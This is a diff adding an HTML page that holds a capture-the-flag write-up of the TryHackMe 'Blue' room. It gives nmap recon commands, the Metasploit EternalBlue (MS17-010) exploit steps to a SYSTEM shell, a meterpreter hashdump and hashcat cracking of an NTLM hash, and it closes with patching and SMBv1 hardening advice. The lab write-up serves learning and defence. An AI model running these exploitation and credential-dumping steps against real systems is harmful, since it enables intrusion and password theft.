@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Blue — TryHackMe Writeup (Lanky)</title>
+  <meta name="description" content="TryHackMe: Blue — EternalBlue (MS17-010) on Windows 7 to SYSTEM.">
+  <link rel="stylesheet" href="../assets/style.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127875;</text></svg>">
+</head>
+<body>
+  <header class="nav">
+    <div class="wrap">
+      <a class="brand" href="../index.html">lanky<span class="accent">.pwns</span></a>
+      <a class="link" href="../index.html#writeups">← all writeups</a>
+    </div>
+  </header>
+
+  <article class="wrap">
+    <a class="back" href="../index.html#writeups">back to writeups</a>
+    <h1 style="margin-top:16px;">Blue</h1>
+    <div class="subtitle">TryHackMe · <a href="https://tryhackme.com/room/blue" target="_blank" rel="noopener">tryhackme.com/room/blue</a></div>
+    <div class="machine-meta">
+      <span class="pill" style="color:var(--cyan);border-color:rgba(46,230,214,0.35)">Windows</span>
+      <span class="pill diff-easy">Easy</span>
+      <span class="pill">EternalBlue</span>
+      <span class="pill rooted">● completed</span>
+    </div>
+
+    <div class="contact" style="margin:0 0 22px;">
+      <a class="btn primary" href="https://www.youtube.com/watch?v=4cbWAqjNt_M" target="_blank" rel="noopener">▶ Watch the walkthrough</a>
+    </div>
+
+    <div class="callout">
+      <span class="tag">TL;DR</span>
+      Unpatched Windows 7 vulnerable to <strong>MS17-010 (EternalBlue)</strong>. Exploit over SMB for a
+      SYSTEM shell, then dump and crack a local account's NTLM hash.
+    </div>
+
+    <h2><span class="num">01</span>Recon</h2>
+    <pre data-lang="bash"><code>nmap -sC -sV -oN nmap/blue 10.10.X.X
+# 135 msrpc, 139/445 SMB, 3389 RDP — Windows 7 Pro
+# SMB vuln scan:
+nmap -p445 --script smb-vuln-ms17-010 10.10.X.X   # VULNERABLE: MS17-010</code></pre>
+
+    <h2><span class="num">02</span>Exploitation — EternalBlue</h2>
+    <pre data-lang="bash"><code>msfconsole -q
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.10.X.X
+set LHOST tun0
+run
+# -> shell as NT AUTHORITY\SYSTEM</code></pre>
+    <p>Backgrounded the shell and upgraded to a full meterpreter, then migrated into a stable x64 process so the session survived.</p>
+
+    <h2><span class="num">03</span>Post-exploitation — dump &amp; crack</h2>
+    <pre data-lang="bash"><code>meterpreter &gt; hashdump
+# Administrator:500:...   Jon:1000:aad3b...:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+# crack the non-default user (Jon):
+hashcat -m 1000 jon.hash /usr/share/wordlists/rockyou.txt   # -> alqfna22</code></pre>
+    <div class="flag"><span class="label">flags (×3)</span>THM{…} — root of C:\, SAM/config, and Jon's Documents</div>
+
+    <h2><span class="num">04</span>Takeaways</h2>
+    <ul>
+      <li><strong>Patch management is the whole lesson</strong> — MS17-010 was fixed in 2017; unpatched SMB is instant SYSTEM.</li>
+      <li><strong>Disable SMBv1</strong> and segment/​firewall 445 off untrusted networks.</li>
+      <li>Local NTLM hashes crack fast against rockyou when passwords are weak — enforce length + block reuse.</li>
+    </ul>
+
+    <p style="margin-top:40px;"><a class="back" href="../index.html#writeups">back to writeups</a></p>
+  </article>
+
+  <footer><div class="wrap">Blue · TryHackMe · Lanky &nbsp;·&nbsp; <a href="../index.html#writeups">all writeups</a></div></footer>
+</body>
+</html>
